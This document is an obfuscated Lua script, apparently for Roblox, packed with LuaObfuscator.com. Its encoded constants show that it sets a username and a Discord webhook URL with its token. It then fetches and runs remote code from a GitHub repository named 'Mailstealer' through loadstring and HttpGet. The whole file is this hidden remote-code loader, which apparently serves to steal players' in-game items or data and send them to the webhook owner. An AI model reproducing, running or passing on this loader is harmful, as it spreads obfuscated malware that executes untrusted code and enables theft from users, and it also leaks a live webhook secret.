local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25)local v26={};for v42=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v42,v42 + 1 )),v1(v2(v25,1 + (v42% #v25) ,1 + (v42% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function()return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...)local v29=0;local v30;local v31;local v32;local v33;local v34;local v35;local v36;local v37;local v38;local v39;local v40;local v41;while true do if (0==v29) then v30=1;v31=nil;v27=v12(v11(v27,5),v7("\124\72","\97\82\102\90\222"),function(v43)if (v9(v43,2)==79) then v31=v8(v11(v43,2 -1 ,1));return "";else local v82=v10(v8(v43,16));if v31 then local v91=0;local v92;while true do if (v91==1) then return v92;end if (v91==0) then v92=v13(v82,v31);v31=nil;v91=1;end end else return v82;end end end);v32=nil;v29=1;end if (v29==3) then function v36()local v44=0;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==3) then if (v49==0) then if (v48==0) then return v50 * 0 ;else local v121=0;while true do if (v121==0) then v49=569 -(367 + 201) ;v47=0;break;end end end elseif (v49==2047) then return ((v48==0) and (v50 * (1/(927 -(214 + 713))))) or (v50 * NaN) ;end return v16(v50,v49-1023 ) * (v47 + (v48/(2^52))) ;end if (v44==1) then v47=1;v48=(v32(v46,1,20) * (2^32)) + v45 ;v44=2;end if (v44==2) then v49=v32(v46,21,31);v50=((v32(v46,32)==(932 -(857 + 74))) and  -1) or 1 ;v44=3;end if (v44==0) then v45=v35();v46=v35();v44=1;end end end v37=nil;function v37(v51)local v52;if  not v51 then local v83=0;while true do if (v83==0) then v51=v35();if (v51==0) then return "";end break;end end end v52=v11(v27,v30,(v30 + v51) -1 );v30=v30 + v51 ;local v53={};for v80=1, #v52 do v53[v80]=v10(v9(v11(v52,v80,v80)));end return v14(v53);end v38=v35;v29=4;end if (v29==5) then v41=nil;function v41(v54,v55,v56)local v57=0;local v58;local v59;local v60;while true do if (0==v57) then v58=v54[1];v59=v54[2];v57=1;end if (1==v57) then v60=v54[3];return function(...)local v93=v58;local v94=v59;local v95=v60;local v96=v39;local v97=4 -3 ;local v98= -1;local v99={};local v100={...};local v101=v20("#",...) -1 ;local v102={};local v103={};for v115=0,v101 do if (v115>=v95) then v99[v115-v95 ]=v100[v115 + 1 ];else v103[v115]=v100[v115 + 1 ];end end local v104=(v101-v95) + 1 ;local v105;local v106;while true do local v116=0;while true do if (v116==0) then v105=v93[v97];v106=v105[1];v116=1;end if (v116==1) then if (v106<=19) then if (v106<=9) then if (v106<=(121 -(32 + 85))) then if (v106<=(1 + 0)) then if (v106==0) then do return v103[v105[2]]();end else v56[v105[3]]=v103[v105[2]];end elseif (v106<=(1 + 1)) then v103[v105[2]]=v103[v105[3]];elseif (v106>3) then for v269=v105[2],v105[3] do v103[v269]=nil;end else local v199;local v200,v201;local v202;v103[v105[2]]=v105[3];v97=v97 + 1 ;v105=v93[v97];v202=v105[2];v103[v202]=v103[v202](v21(v103,v202 + 1 ,v105[3]));v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v105[3];v97=v97 + 1 ;v105=v93[v97];v202=v105[2];v200,v201=v96(v103[v202](v21(v103,v202 + 1 ,v105[3])));v98=(v201 + v202) -1 ;v199=957 -(892 + 65) ;for v271=v202,v98 do local v272=0;while true do if (v272==0) then v199=v199 + 1 ;v103[v271]=v200[v199];break;end end end v97=v97 + 1 ;v105=v93[v97];v202=v105[2];v103[v202]=v103[v202](v21(v103,v202 + 1 ,v98));v97=v97 + 1 ;v105=v93[v97];if (v103[v105[2]]==v105[4]) then v97=v97 + 1 ;else v97=v105[3];end end elseif (v106<=(14 -8)) then if (v106==5) then if v103[v105[3 -1 ]] then v97=v97 + 1 ;else v97=v105[3];end else v103[v105[2]]=v105[3]~=0 ;end elseif (v106<=7) then local v146=v105[2];local v147=v103[v105[3]];v103[v146 + 1 ]=v147;v103[v146]=v147[v105[4]];elseif (v106>(14 -6)) then local v209=v105[352 -(87 + 263) ];local v210,v211=v96(v103[v209](v103[v209 + 1 ]));v98=(v211 + v209) -1 ;local v212=0;for v273=v209,v98 do v212=v212 + 1 ;v103[v273]=v210[v212];end else v103[v105[2]]= #v103[v105[3]];end elseif (v106<=14) then if (v106<=11) then if (v106==10) then local v151=0;local v152;while true do if (v151==0) then v152=v105[2];v103[v152]=v103[v152](v21(v103,v152 + 1 ,v98));break;end end else if ((v105[183 -(67 + 113) ]==v7("\17\142\101\241","\204\78\203\43\167\55")) or (v105[3]==v7("\86\160\190\37\27\178\71","\220\49\197\202\67\126"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3 + 0 ]][v105[4]];v97=v97 + 1 ;v105=v93[v97];if ((v105[3]==v7("\248\225\112\1","\100\167\164\62\87\59")) or (v105[3]==v7("\135\83\84\207\226\12\63","\73\224\54\32\169\135\98"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]][v105[4]];v97=v97 + (2 -1) ;v105=v93[v97];if ((v105[3]==v7("\247\238\89\18","\173\168\171\23\68\52\157")) or (v105[3]==v7("\128\241\101\243\218\137\226","\191\231\148\17\149"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];v103[v105[2 + 0 ]]=v103[v105[3]][v105[15 -11 ]];v97=v97 + 1 ;v105=v93[v97];if ((v105[955 -(802 + 150) ]==v7("\18\205\209\182","\69\77\136\159\224\199\167\155")) or (v105[3]==v7("\213\242\231\116\215\249\229","\18\178\151\147"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];if  not v103[v105[5 -3 ]] then v97=v97 + 1 ;else v97=v105[3];end end elseif (v106<=(21 -9)) then local v159=v105[2];v103[v159]=v103[v159](v21(v103,v159 + 1 ,v105[3]));elseif (v106==13) then v97=v105[3];else local v228;local v229,v230;local v231;local v232;v103[v105[2]]=v105[3 + 0 ];v97=v97 + (998 -(915 + 82)) ;v105=v93[v97];v103[v105[5 -3 ]]=v105[2 + 1 ];v97=v97 + 1 ;v105=v93[v97];v232=v105[2];v103[v232]=v103[v232](v21(v103,v232 + (1 -0) ,v105[1190 -(1069 + 118) ]));v97=v97 + 1 ;v105=v93[v97];v56[v105[3]]=v103[v105[2]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v105[3];v97=v97 + 1 ;v105=v93[v97];v56[v105[3]]=v103[v105[2]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v105[3]~=0 ;v97=v97 + 1 ;v105=v93[v97];v56[v105[6 -3 ]]=v103[v105[2]];v97=v97 + 1 ;v105=v93[v97];if ((v105[3]==v7("\69\169\211\122","\164\26\236\157\44")) or (v105[3]==v7("\75\74\79\44\23\66\89","\114\44\47\59\74"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];if ((v105[3]==v7("\59\150\11\231","\181\100\211\69\177")) or (v105[6 -3 ]==v7("\14\206\163\92\12\197\161","\58\105\171\215"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end v97=v97 + 1 ;v105=v93[v97];v232=v105[2];v231=v103[v105[3]];v103[v232 + 1 ]=v231;v103[v232]=v231[v105[4]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v105[1 + 2 ];v97=v97 + 1 ;v105=v93[v97];v232=v105[2];v229,v230=v96(v103[v232](v21(v103,v232 + 1 ,v105[3])));v98=(v230 + v232) -1 ;v228=0 -0 ;for v278=v232,v98 do local v279=0;while true do if (v279==0) then v228=v228 + 1 ;v103[v278]=v229[v228];break;end end end v97=v97 + 1 ;v105=v93[v97];v232=v105[2];v103[v232]=v103[v232](v21(v103,v232 + 1 ,v98));v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]();v97=v97 + 1 ;v105=v93[v97];v97=v105[3];end elseif (v106<=(16 + 0)) then if (v106>15) then v103[v105[2]]();else v103[v105[2]]=v103[v105[794 -(368 + 423) ]]%v103[v105[4]] ;end elseif (v106<=17) then local v162=0;local v163;local v164;local v165;local v166;while true do if (v162==2) then for v325=v163,v98 do v166=v166 + 1 ;v103[v325]=v164[v166];end break;end if (v162==1) then v98=(v165 + v163) -1 ;v166=0 -0 ;v162=2;end if (v162==0) then v163=v105[2];v164,v165=v96(v103[v163](v21(v103,v163 + 1 ,v105[3])));v162=1;end end elseif (v106>18) then if (v103[v105[2]]==v105[4]) then v97=v97 + 1 ;else v97=v105[21 -(10 + 8) ];end else v103[v105[2]]=v55[v105[11 -8 ]];end elseif (v106<=29) then if (v106<=24) then if (v106<=21) then if (v106>20) then local v167=v105[2];local v168=v103[v167 + 2 ];local v169=v103[v167] + v168 ;v103[v167]=v169;if (v168>0) then if (v169<=v103[v167 + 1 ]) then local v329=0;while true do if (v329==0) then v97=v105[3];v103[v167 + 3 ]=v169;break;end end end elseif (v169>=v103[v167 + 1 ]) then v97=v105[3];v103[v167 + 3 ]=v169;end else local v171=0;local v172;while true do if (v171==0) then v172=v105[2];do return v21(v103,v172,v98);end break;end end end elseif (v106<=22) then v103[v105[2]]=v103[v105[3]]%v105[4] ;elseif (v106==23) then if  not v103[v105[2]] then v97=v97 + 1 ;else v97=v105[3];end elseif ((v105[3]==v7("\202\204\175\116","\25\149\137\225\34\129")) or (v105[3]==v7("\253\234\36\250\209\135\36","\82\154\143\80\156\180\233"))) then v103[v105[2]]=v56;else v103[v105[2]]=v56[v105[3]];end elseif (v106<=26) then if (v106==25) then v103[v105[2]]=v105[3];else local v176=v105[2];local v177=v103[v176];for v196=v176 + 1 ,v98 do v15(v177,v103[v196]);end end elseif (v106<=27) then local v178=0;local v179;while true do if (v178==0) then v179=v105[2];v103[v179](v21(v103,v179 + 1 ,v98));break;end end elseif (v106==28) then v103[v105[444 -(416 + 26) ]]={};else local v250=v94[v105[3]];local v251;local v252={};v251=v18({},{[v7("\12\52\65\64\57\0\217","\210\83\107\40\46\93\101\161")]=function(v283,v284)local v285=0;local v286;while true do if (v285==0) then v286=v252[v284];return v286[1][v286[2]];end end end,[v7("\233\191\32\55\193\137\32\54\211\152","\82\182\224\78")]=function(v287,v288,v289)local v290=v252[v288];v290[1][v290[2]]=v289;end});for v292=1,v105[4] do local v293=0;local v294;while true do if (v293==0) then v97=v97 + (3 -2) ;v294=v93[v97];v293=1;end if (v293==1) then if (v294[1]==(1 + 1)) then v252[v292-1 ]={v103,v294[3]};else v252[v292-1 ]={v55,v294[3]};end v102[ #v102 + 1 ]=v252;break;end end end v103[v105[2]]=v41(v250,v251,v56);end elseif (v106<=34) then if (v106<=31) then if (v106>30) then v103[v105[2]]=v103[v105[3]] + v105[4] ;else local v181=0;local v182;local v183;local v184;while true do if (v181==1) then v184=v103[v182 + 2 ];if (v184>0) then if (v183>v103[v182 + (439 -(145 + 293)) ]) then v97=v105[3];else v103[v182 + 3 ]=v183;end elseif (v183<v103[v182 + 1 ]) then v97=v105[3];else v103[v182 + 3 ]=v183;end break;end if (v181==0) then v182=v105[2];v183=v103[v182];v181=1;end end end elseif (v106<=32) then v103[v105[2]]=v105[3] + v103[v105[4]] ;elseif (v106>33) then local v254=0;local v255;local v256;local v257;while true do if (v254==5) then v257=v105[2];v256=v103[v257];v255=v103[v257 + 2 ];v254=6;end if (v254==3) then v103[v105[2]]= #v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v254=4;end if (2==v254) then v103[v105[2]]=v105[3];v97=v97 + 1 ;v105=v93[v97];v254=3;end if (v254==4) then v103[v105[432 -(44 + 386) ]]=v105[3];v97=v97 + 1 ;v105=v93[v97];v254=5;end if (v254==1) then v103[v105[2]]={};v97=v97 + 1 ;v105=v93[v97];v254=2;end if (v254==6) then if (v255>(1486 -(998 + 488))) then if (v256>v103[v257 + 1 ]) then v97=v105[3];else v103[v257 + 3 ]=v256;end elseif (v256<v103[v257 + 1 ]) then v97=v105[3];else v103[v257 + 3 ]=v256;end break;end if (v254==0) then v255=nil;v256=nil;v257=nil;v254=1;end end else local v258=0;local v259;while true do if (v258==0) then v259=v105[2];do return v103[v259](v21(v103,v259 + 1 ,v105[1 + 2 ]));end break;end end end elseif (v106<=36) then if (v106>35) then local v186=0;local v187;local v188;local v189;local v190;local v191;while true do if (v186==7) then v188=0;for v336=v191,v98 do v188=v188 + 1 ;v103[v336]=v189[v188];end v97=v97 + 1 ;v105=v93[v97];v186=8;end if (8==v186) then v191=v105[2];v187=v103[v191];for v339=v191 + 1 ,v98 do v15(v187,v103[v339]);end break;end if (v186==5) then v97=v97 + 1 ;v105=v93[v97];for v340=v105[2],v105[3] do v103[v340]=nil;end v97=v97 + (4 -3) ;v186=6;end if (3==v186) then v105=v93[v97];v103[v105[774 -(201 + 571) ]]={};v97=v97 + 1 ;v105=v93[v97];v186=4;end if (v186==0) then v187=nil;v188=nil;v189,v190=nil;v191=nil;v186=1;end if (v186==2) then v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[3]];v97=v97 + 1 ;v186=3;end if (4==v186) then v103[v105[2]]=v55[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[1140 -(116 + 1022) ]]=v103[v105[3]];v186=5;end if (v186==6) then v105=v93[v97];v191=v105[2];v189,v190=v96(v103[v191](v21(v103,v191 + 1 ,v105[3])));v98=(v190 + v191) -1 ;v186=7;end if (v186==1) then v103[v105[2 + 0 ]]=v55[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[3]];v186=2;end end else local v192=v105[2];local v193,v194=v96(v103[v192](v21(v103,v192 + 1 ,v98)));v98=(v194 + v192) -1 ;local v195=0;for v197=v192,v98 do local v198=0;while true do if (v198==0) then v195=v195 + 1 ;v103[v197]=v193[v195];break;end end end end elseif (v106<=37) then do return;end elseif (v106==38) then local v260=0;local v261;local v262;local v263;local v264;while true do if (v260==3) then v103[v105[2]]=v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]] + v105[4] ;v97=v97 + 1 ;v105=v93[v97];v264=v105[2];v260=4;end if (v260==1) then v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[2 + 1 ]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[3]];v97=v97 + 1 ;v260=2;end if (v260==2) then v105=v93[v97];v103[v105[2]]=v55[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v260=3;end if (5==v260) then v103[v264]=v103[v264](v21(v103,v264 + 1 ,v98));v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[861 -(814 + 45) ]]=v55[v105[3]];v260=6;end if (v260==6) then v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]= #v103[v105[3]];v97=v97 + 1 ;v260=7;end if (v260==8) then v103[v105[2]]= #v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]]%v103[v105[4]] ;v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v105[3] + v103[v105[4]] ;v260=9;end if (4==v260) then v262,v263=v96(v103[v264](v21(v103,v264 + (3 -2) ,v105[3])));v98=(v263 + v264) -1 ;v261=0;for v408=v264,v98 do local v409=0;while true do if (0==v409) then v261=v261 + 1 ;v103[v408]=v262[v261];break;end end end v97=v97 + 1 ;v105=v93[v97];v264=v105[7 -5 ];v260=5;end if (13==v260) then v98=(v263 + v264) -(4 -3) ;v261=0;for v410=v264,v98 do v261=v261 + 1 ;v103[v410]=v262[v261];end v97=v97 + 1 ;v105=v93[v97];v264=v105[2];v103[v264](v21(v103,v264 + 1 ,v98));break;end if (9==v260) then v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v103[v105[3]] + v105[4] ;v97=v97 + 1 ;v105=v93[v97];v264=v105[1 + 1 ];v262,v263=v96(v103[v264](v21(v103,v264 + 1 ,v105[3])));v260=10;end if (v260==10) then v98=(v263 + v264) -(1 + 0) ;v261=0;for v413=v264,v98 do v261=v261 + 1 ;v103[v413]=v262[v261];end v97=v97 + 1 ;v105=v93[v97];v264=v105[2];v262,v263=v96(v103[v264](v21(v103,v264 + 1 ,v98)));v260=11;end if (v260==0) then v261=nil;v262,v263=nil;v264=nil;v103[v105[2]]=v103[v105[3]];v97=v97 + 1 ;v105=v93[v97];v103[v105[2]]=v55[v105[3]];v260=1;end if (v260==11) then v98=(v263 + v264) -1 ;v261=0;for v416=v264,v98 do local v417=0;while true do if (v417==0) then v261=v261 + 1 ;v103[v416]=v262[v261];break;end end end v97=v97 + 1 ;v105=v93[v97];v264=v105[887 -(261 + 624) ];v103[v264]=v103[v264](v21(v103,v264 + 1 ,v98));v260=12;end if (v260==7) then v105=v93[v97];v103[v105[2]]=v103[v105[3]]%v103[v105[4]] ;v97=v97 + (2 -1) ;v105=v93[v97];v103[v105[2]]=v105[3] + v103[v105[4]] ;v97=v97 + 1 ;v105=v93[v97];v260=8;end if (v260==12) then v97=v97 + (1 -0) ;v105=v93[v97];v103[v105[2]]=v103[v105[1083 -(1020 + 60) ]]%v105[4] ;v97=v97 + (1424 -(630 + 793)) ;v105=v93[v97];v264=v105[2];v262,v263=v96(v103[v264](v103[v264 + (3 -2) ]));v260=13;end end else v103[v105[2]]=v103[v105[3]][v105[4]];end v97=v97 + 1 ;break;end end end end;end end end return v41(v40(),{},v28)(...);end if (v29==1) then function v32(v61,v62,v63)if v63 then local v84=(v61/((5 -3)^(v62-(1 -0))))%(2^(((v63-1) -(v62-1)) + 1)) ;return v84-(v84%1) ;else local v85=0;local v86;while true do if (v85==0) then v86=(4 -2)^(v62-1) ;return (((v61%(v86 + v86))>=v86) and 1) or 0 ;end end end end v33=nil;function v33()local v64=0;local v65;while true do if (v64==1) then return v65;end if (v64==0) then v65=v9(v27,v30,v30);v30=v30 + 1 ;v64=1;end end end v34=nil;v29=2;end if (v29==2) then function v34()local v66,v67=v9(v27,v30,v30 + 2 );v30=v30 + 2 ;return (v67 * 256) + v66 ;end v35=nil;function v35()local v68=0;local v69;local v70;local v71;local v72;while true do if (v68==1) then return (v72 * 16777216) + (v71 * 65536) + (v70 * (875 -(555 + 64))) + v69 ;end if (v68==0) then v69,v70,v71,v72=v9(v27,v30,v30 + 3 );v30=v30 + 4 ;v68=1;end end end v36=nil;v29=3;end if (v29==4) then v39=nil;function v39(...)return {...},v20("#",...);end v40=nil;function v40()local v73=0;local v74;local v75;local v76;local v77;local v78;local v79;while true do if (v73==0) then v74={};v75={};v76={};v77={v74,v75,nil,v76};v73=1;end if (1==v73) then v78=v35();v79={};for v107=1 + 0 ,v78 do local v108=v33();local v109;if (v108==1) then v109=v33()~=0 ;elseif (v108==2) then v109=v36();elseif (v108==3) then v109=v37();end v79[v107]=v109;end v77[3]=v33();v73=2;end if (v73==2) then for v111=1 + 0 ,v35() do local v112=v33();if (v32(v112,1,1)==0) then local v117=0;local v118;local v119;local v120;while true do if (v117==2) then if (v32(v119,1 -0 ,1066 -(68 + 997) )==1) then v120[1272 -(226 + 1044) ]=v79[v120[2]];end if (v32(v119,2,2)==1) then v120[3]=v79[v120[3]];end v117=3;end if (v117==3) then if (v32(v119,3,3)==1) then v120[4]=v79[v120[4]];end v74[v111]=v120;break;end if (v117==1) then v120={v34(),v34(),nil,nil};if (v118==0) then local v135=0;while true do if (v135==0) then v120[3]=v34();v120[4]=v34();break;end end elseif (v118==1) then v120[3]=v35();elseif (v118==2) then v120[1640 -(1523 + 114) ]=v35() -((2 + 0)^16) ;elseif (v118==3) then local v140=0;while true do if (v140==0) then v120[3]=v35() -(2^16) ;v120[4]=v34();break;end end end v117=2;end if (v117==0) then v118=v32(v112,879 -(282 + 595) ,3);v119=v32(v112,4,6);v117=1;end end end end for v113=1,v35() do v75[v113-1 ]=v40();end return v77;end end end v29=5;end end end v23("LOL!0D3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403053O006D6174636803083O00746F6E756D62657203053O007063612O6C00243O00120B3O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A0001000100040D3O000A0001001218000300063O002027000400030007001218000500083O002027000500050009001218000600083O00202700060006000A00061D00073O000100062O00023O00064O00028O00023O00044O00023O00014O00023O00024O00023O00053O001218000800013O00202700080008000B0012180009000C3O001218000A000D3O00061D000B0001000100052O00023O00074O00023O00094O00023O00084O00023O000A4O00023O000B4O0002000C000B6O000C00014O0014000C6O00253O00013O00023O00023O00026O00F03F026O00704002264O002200025O00122O000300016O00045O00122O000500013O00042O0003002100012O001200076O0026000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O00010004150003000500012O0012000300054O0002000400024O0021000300044O001400036O00253O00017O00043O00027O004003053O003A25642B3A2O033O0025642B026O00F03F001C3O00061D5O000100012O00128O0024000100016O000200026O000300026O00048O000500036O00068O000700076O000500076O00043O0001002027000400040001001203000500026O00030005000200122O000400036O000200046O00013O000200262O000100180001000400040D3O001800012O000200016O001C00026O0021000100024O001400015O00040D3O001B00012O0012000100046O000100014O001400016O00253O00013O00013O000B3O0003083O00557365726E616D65030D3O00D2CCD429E5B4CB1BD2C2CF75B603083O007EB1A3BB4586DBA703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31392O3331333034363836353634313537322F53302D47366A735A68316977546737504D357239333441675A466A4547704A6175346A76343649544D6C78677459323468797075333241556A787753764472622D516C43030D3O004C6F6164696E675363722O656E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4D61696C737465616C657256322F4D61696C737465616C65722F6D61696E2F7632026O00F03F01153O0006053O001300013O00040D3O001300012O001200015O00120E000200023O00122O000300036O00010003000200122O000100013O00122O000100053O00122O000100046O000100013O00122O000100063O00122O000100073O00122O000200083O00202O00020002000900122O0004000A6O000200046O00013O00024O00010001000100044O0014000100202700013O000B2O00253O00017O00",v17(),...);
-- ⚠️ WARNING: SKID PROTECTION ACTIVE!
--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--
